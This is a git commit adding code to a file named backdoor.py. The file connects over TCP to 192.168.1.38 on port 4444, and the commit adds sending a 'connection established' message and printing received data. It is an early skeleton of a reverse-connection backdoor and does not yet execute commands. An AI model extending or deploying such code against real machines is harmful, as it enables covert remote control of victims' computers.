54a262c6a3e2ac292ec44303b955bf4cf1fd8afb
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-04 16:16:21 +0530

    Sending anf recieving data over TCP

--- backdoor.py
+++ backdoor.py
@@ -5,3 +5,16 @@ import socket
 connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 connection.connect(("192.168.1.38", 4444))
 
+connection.send("\n[+] Connection established.\n".encode())
+
+
+recieved_data = connection.recv(1024)
+print(recieved_data)
+
+
+
+
+
+
+connection.close()
+
